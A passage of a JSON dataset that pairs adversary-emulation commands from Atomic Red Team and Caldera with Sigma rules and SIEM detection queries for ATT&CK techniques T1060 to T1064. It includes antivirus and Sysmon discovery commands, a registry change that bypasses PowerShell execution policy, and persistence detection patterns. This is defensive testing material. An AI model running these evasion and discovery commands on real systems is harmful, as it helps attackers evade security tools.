\"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Direct autorun keys modification\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:(*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows* *\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders* *\\\\\\\\system\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\SafeBoot\\\\\\\\AlternateShell*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\reg.exe\" CommandLine=\"*add*\" (CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows*\" OR CommandLine=\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders*\" OR CommandLine=\"*\\\\\\\\system\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\SafeBoot\\\\\\\\AlternateShell*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\reg.exe\" CommandLine=\"*add*\" CommandLine IN [\"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnce*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunOnceEx*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServices*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\RunServicesOnce*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Userinit*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\Shell*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Windows*\", \"*\\\\\\\\software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Explorer\\\\\\\\User Shell Folders*\", \"*\\\\\\\\system\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\SafeBoot\\\\\\\\AlternateShell*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\reg\\\\.exe)(?=.*.*add.*)(?=.*(?:.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell.*|.*.*\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows.*|.*.*\\\\software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders.*|.*.*\\\\system\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\AlternateShell.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious netsh Dll persistence\nid: 56321594-9087-49d9-bf10-524fe8479452\ndescription: Detects pesitence via netsh helper\nstatus: test\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/25\nmodified: 2019/10/25\nauthor: Victor Sergeev, oscd.community\nlogsource:\n    category: process_creation\n    product: windows   \ndetection:\n    selection:\n        Image|endswith: '\\netsh.exe'\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious netsh Dll persistence\nid: 56321594-9087-49d9-bf10-524fe8479452\ndescription: Detects pesitence via netsh helper\nstatus: test\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.yaml\ntags:\n    - attack.persistence\n    - attack.t1060\ndate: 2019/10/25\nmodified: 2019/10/25\nauthor: Victor Sergeev, oscd.community\nlogsource:\n    category: process_creation\n    product: windows   \ndetection:\n    selection:\n        Image|endswith: '\\netsh.exe'\n        CommandLine|contains|all:\n            - 'add'\n            - 'helper'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\netsh.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:*helper*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-netsh-Dll-persistence <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious netsh Dll persistence\",\\n    \"description\": \"Detects pesitence via netsh helper\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1060\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\netsh.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:*helper*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\netsh.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:*helper*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious netsh Dll persistence\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\netsh.exe AND CommandLine.keyword:*add* AND CommandLine.keyword:*helper*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\netsh.exe\" CommandLine=\"*add*\" CommandLine=\"*helper*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\netsh.exe\" CommandLine=\"*add*\" CommandLine=\"*helper*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\netsh\\\\.exe)(?=.*.*add.*)(?=.*.*helper.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "name": null}, {"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath C:\\Temp\\test.vhdx -NewVHDSizeBytes 21474836480\n", "name": null}, {"source": "atomics/T1062/T1062.yaml", "command": "Get-WindowsFeature -Name Hyper-V -ComputerName test-vm\nInstall-WindowsFeature -Name Hyper-V -ComputerName test-vm -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "name": null}], "command_list": ["Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name testvm -MemoryStartupBytes 1GB -NewVHDPath C:\\Temp\\test.vhdx -NewVHDSizeBytes 21474836480\n", "Get-WindowsFeature -Name Hyper-V -ComputerName test-vm\nInstall-WindowsFeature -Name Hyper-V -ComputerName test-vm -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n"], "technique_id": "T1062", "parsed_datasets": [{"Atomic Red Team Test - Hypervisor": {"display_name": "Hypervisor", "atomic_tests": [{"description": "PowerShell command to check if Hyper-v is installed .\nInstall Hyper-V feature.\nCreate a New-VM\n", "supported_platforms": ["windows"], "name": "Installing Hyper-V Feature", "input_arguments": {"vm_name": {"default": "testvm", "type": "string", "description": "Create a new VM."}, "file_location": {"default": "C:\\Temp\\test.vhdx", "type": "string", "description": "Location of new VHDX file"}, "hostname": {"default": "test-vm", "type": "string", "description": "Host to query to see if Hyper-V feature is installed."}}, "executor": {"command": "Get-WindowsFeature -Name Hyper-V -ComputerName #{hostname}\nInstall-WindowsFeature -Name Hyper-V -ComputerName #{hostname} -IncludeManagementTools\nNew-VM -Name #{vm_name} -MemoryStartupBytes 1GB -NewVHDPath #{file_location} -NewVHDSizeBytes 21474836480\n", "name": "powershell"}}], "attack_technique": "T1062"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1063/T1063.yaml", "command": "netsh.exe advfirewall firewall show all profiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "fltmc.exe | findstr.exe 385201\n", "name": null}, {"source": "atomics/T1063/T1063.yaml", "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "name": null}, {"source": "data/abilities/discovery/2dece965-37a0-4f70-a391-0f30e3331aba.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}, "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}, "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"}}}, "name": "Identify AV"}, {"source": "data/abilities/discovery/8c06ebf8-bacf-486b-bd77-21ba8c5a5777.yml", "command": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "name": "Identify Firewalls"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/antivirusproduct", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/antivirusproduct", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> netsh advfirewall firewall show rule name = all\n\nRule Name: Network Discovery (UPnP-In)\n-------------------------------------------------- --------------------\nEnabled: Yes\nDirection: Inbound\nProfile: Dedicated\nGrouping: Network Discovery\nLocal IP: Any\nRemote IP: Any\nProtocol: TCP\nLocal Port: 2869\nRemote Port: Any\nEdge traversal: No\nAction: Allow", "name": "Dos"}], "command_list": ["netsh.exe advfirewall firewall show all profiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n", "fltmc.exe | findstr.exe 385201\n", "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}, "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}, "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"}}}, {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "powershell/situational_awareness/host/antivirusproduct", "powershell/situational_awareness/host/antivirusproduct", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> netsh advfirewall firewall show rule name = all\n\nRule Name: Network Discovery (UPnP-In)\n-------------------------------------------------- --------------------\nEnabled: Yes\nDirection: Inbound\nProfile: Dedicated\nGrouping: Network Discovery\nLocal IP: Any\nRemote IP: Any\nProtocol: TCP\nLocal Port: 2869\nRemote Port: Any\nEdge traversal: No\nAction: Allow"], "technique_id": "T1063", "parsed_datasets": [{"Atomic Red Team Test - Security Software Discovery": {"display_name": "Security Software Discovery", "atomic_tests": [{"description": "Methods to identify Security Software on an endpoint\n", "supported_platforms": ["windows"], "name": "Security Software Discovery", "executor": {"elevation_required": false, "command": "netsh.exe advfirewall firewall show all profiles\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\n", "name": "command_prompt"}}, {"description": "Methods to identify Security Software on an endpoint\n", "supported_platforms": ["windows"], "name": "Security Software Discovery - powershell", "executor": {"elevation_required": false, "command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\n", "name": "powershell"}}, {"description": "Methods to identify Security Software on an endpoint\n", "supported_platforms": ["linux", "macos"], "name": "Security Software Discovery - ps", "executor": {"elevation_required": false, "command": "ps -ef | grep Little\\ Snitch | grep -v grep\nps aux | grep CbOsxSensorService\n", "name": "sh"}}, {"description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n", "supported_platforms": ["windows"], "name": "Security Software Discovery - Sysmon Service", "executor": {"elevation_required": true, "command": "fltmc.exe | findstr.exe 385201\n", "name": "command_prompt"}}, {"description": "Discovery of installed antivirus products via a WMI query.\n", "supported_platforms": ["windows"], "name": "Security Software Discovery - AV Discovery via WMI", "executor": {"elevation_required": true, "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "name": "command_prompt"}}], "attack_technique": "T1063"}}, {"Mitre Stockpile - Identify AV": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}, "command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}, "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"}}}, "description": "Identify AV", "tactic": "discovery", "technique": {"attack_id": "T1063", "name": "Security Software Discovery"}, "id": "2dece965-37a0-4f70-a391-0f30e3331aba", "name": "Discover antivirus programs"}}, {"Mitre Stockpile - Identify Firewalls": {"platforms": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "description": "Identify Firewalls", "tactic": "discovery", "technique": {"attack_id": "T1063", "name": "Security Software Discovery"}, "id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "name": "Identify Firewalls"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1063", "Empire Module": "powershell/situational_awareness/host/antivirusproduct", "Technique": "Security Software Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/antivirusproduct\":  [\"T1063\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and(process_path contains \"netsh.exe\"or process_path contains \"reg.exe\"or process_path contains \"tasklist.exe\")and (process_command_line contains \"*reg* query*\"or process_command_line contains \"*tasklist *\"or process_command_line contains \"*netsh*\"or process_command_line contains \"*fltmc*|*findstr*\")", "product": "Azure Sentinel", "name": "Security Software Discovery"}, {"query": "Yml\ntitle: windows executed locally netsh advfirewall firewall show rule name = all\ndescription: windows server 2016\nreferences: No\ntags: T1063\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ netsh.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: netsh advfirewall firewall show rule name = all # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1064/T1064.yaml", "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"\nchmod +x /tmp/art.sh\nsh /tmp/art.sh\n", "name": null}, {"source": "atomics/T1064/T1064.yaml", "command": "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute} > C:\\Windows\\TEMP\\execute.bat\nC:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat \n", "name": null}, {"source": "atomics/T1064/T1064.yaml", "command": "C:\\Windows\\system32\\cmd.exe /Q /c echo dir > C:\\Windows\\TEMP\\execute.bat\nC:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat \n", "name": null}, {"source": "data/abilities/defense-evasion/3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e.yml", "command": {"windows": {"psh": {"command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"}}}, "name": "Ensure the ExecutionPolicy is turned to Bypass"}, {"source": "data/abilities/execution/3796a00b-b11d-4731-b4ca-275a07d83299.yml", "command": {"windows": {"psh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;\n"}}}, "name": "Run an application as a different user"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.jse", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.js", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vba", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.vbs", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "sh.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "bash.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "wscript.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": 